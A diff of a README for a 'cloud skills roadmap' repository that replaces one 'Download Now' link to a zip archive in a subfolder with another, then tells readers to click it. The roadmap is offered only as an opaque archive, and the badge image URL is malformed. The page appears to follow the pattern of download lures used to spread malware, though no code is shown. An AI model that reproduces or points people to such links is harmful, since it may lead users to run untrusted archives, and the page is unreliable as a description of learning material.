@@ -1,6 +1,6 @@
 # 🌥️ cloud-skills-roadmap - Your Step-by-Step Cloud Journey
 
-[![Download Now](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Project_01/skills-roadmap-cloud-v3.8.zip%20Now-For%20Free-brightgreen)](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Project_01/skills-roadmap-cloud-v3.8.zip)
+[![Download Now](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Month_07_Infrastructure_Monitoring/roadmap_cloud_skills_v1.8-alpha.4.zip%20Now-For%20Free-brightgreen)](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Month_07_Infrastructure_Monitoring/roadmap_cloud_skills_v1.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to the Cloud Skills Roadmap. This guide will help you navigate through a
 
 To get started, visit the link below to download the necessary files.
 
-[Download the Cloud Skills Roadmap](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Project_01/skills-roadmap-cloud-v3.8.zip)
+[Download the Cloud Skills Roadmap](https://github.com/Talhaer/cloud-skills-roadmap/raw/refs/heads/main/Month_07_Infrastructure_Monitoring/roadmap_cloud_skills_v1.8-alpha.4.zip)
 
 1. Click on the link above.
 2. Review the items listed under the "Releases" section.
